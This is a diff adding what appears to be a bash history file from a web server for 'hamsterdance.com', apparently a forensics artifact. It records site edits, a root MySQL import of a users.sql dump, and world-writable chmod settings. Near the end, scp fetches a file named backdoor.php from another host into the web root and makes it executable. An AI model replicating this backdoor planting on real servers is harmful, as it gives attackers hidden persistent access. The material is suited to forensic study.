@@ -1,0 +1,94 @@
+ls
+ping 8.8.8.8
+cd /var/www/html/hamsterdance.com/
+ls
+emacs index.php &
+ls
+emacs style.css
+ls
+cd ../../../
+cd lib/
+ls -l
+cd hamster/
+ls
+ls -l
+chmod 666 *
+exit
+cd mysql
+ls
+mysql
+mysql -u root -p
+mysql -u root -p < /home/user/Desktop/login_page/users.sql
+mysql
+mysql -u root -p
+mysql -u root -p < /home/user/Desktop/login_page/users.sql
+cd ../../www/html/
+ls
+less index.html 
+ls
+ls hamsterdance/
+cd hamsterdance/
+ls
+ls index
+ls index-Dateien/
+cd ../
+ls
+less index.
+less index.php 
+ls
+ls hamsterdance/
+ls hamsterdance/index
+ls hamsterdance/index-Dateien/
+less hamsterdance/index.html 
+ls
+cd hamsterdance/
+ls
+cp ../config.php .
+less index.php 
+less style.css 
+emacs index.html 
+mv index.html hamster.html
+emacs index.php 
+cd ../
+mv hamsterdance/ hamsterdance.com
+cd ../../lib/mysql
+ls
+cd hamster/
+ls
+less info.php 
+rm info.php 
+less index.html 
+less index.php 
+rm index.php 
+ls
+rm home.php 
+rm config.php 
+ls
+cd hamsterdance.com/
+ls
+cd ../../
+ls
+cd ../
+ls
+cd www/html/hamsterdance.com/
+ls
+emacs index.php 
+cp index.php /home/user/Desktop/Logical_Copy/var/www/html/hamsterdance.com/.
+exit
+mysql -u root -p
+exit
+cd ../var
+cd /var
+cd www/html/
+ls
+cd hamsterdance.com/
+ls
+scp damian@192.168.156.137:/home/damian/Documents/scripts/backdoor.php .
+ls -l
+chmod 777 backdoor.php 
+exit
+cd /var/www/html/hamsterdance.com/
+ls
+less backdoor.php 
+ls -l
+exit
